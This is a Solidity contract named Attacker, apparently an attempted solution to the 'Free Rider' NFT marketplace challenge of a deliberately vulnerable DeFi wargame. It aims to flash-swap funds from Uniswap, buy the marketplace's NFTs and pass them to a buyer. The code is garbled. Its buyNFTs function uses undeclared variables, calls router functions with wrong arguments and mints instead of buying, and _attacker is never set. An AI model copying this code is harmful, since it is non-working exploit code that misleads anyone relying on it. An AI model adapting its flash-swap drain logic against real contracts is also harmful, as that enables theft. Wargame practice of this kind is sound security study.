// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
import {ReentrancyGuard} from "openzeppelin-contracts/security/ReentrancyGuard.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import {IERC721} from "openzeppelin-contracts/token/ERC721/IERC721.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

contract Attacker is IERC721Receiver, ReentrancyGuard {
    address private immutable _buyer;
    address private immutable _attacker;
    address public dvt;
    address public weth;

    IERC721 private immutable _nft;
    uint256 private _received;

    constructor(address buyer_, address nft_) payable {
        _buyer = buyer_;
        _nft = IERC721(nft_);
        IERC721(nft_).setApprovalForAll(msg.sender, true);
    }

    // Function to perform the flash swap and buy NFTs
    function buyNFTs() public payable {

        // Borrow the desired amount from the pool
        router.swapExactTokensForETH(
            amount,
            minOutputAmount,
            [poolAddress],
            address(this)
        );

        // Use the borrowed funds to buy the NFTs
        ERC721 nftContract = ERC721(nftContractAddress);
        nftContract.safeMint(msg.sender, 1);

        // Return the borrowed funds to the pool
        router.addLiquidity(
            amount,
            minOutputAmount,
            maxOutputAmount,
            poolAddress,
            address(this),
            deadline
        );
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override nonReentrant returns (bytes4) {
        require(msg.sender == address(_nft));
        // This require might be the way to exploit it.
        require(tx.origin == _attacker);
        require(_tokenId >= 0 && _tokenId <= 5);
        require(_nft.ownerOf(_tokenId) == address(this));

        _received++;
        if (_received == 6) {
            uint256 i;
            for (i = 0; i < _received; i++) {
                IERC721(_nft).transfer(address(_buyer), i);
            }
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
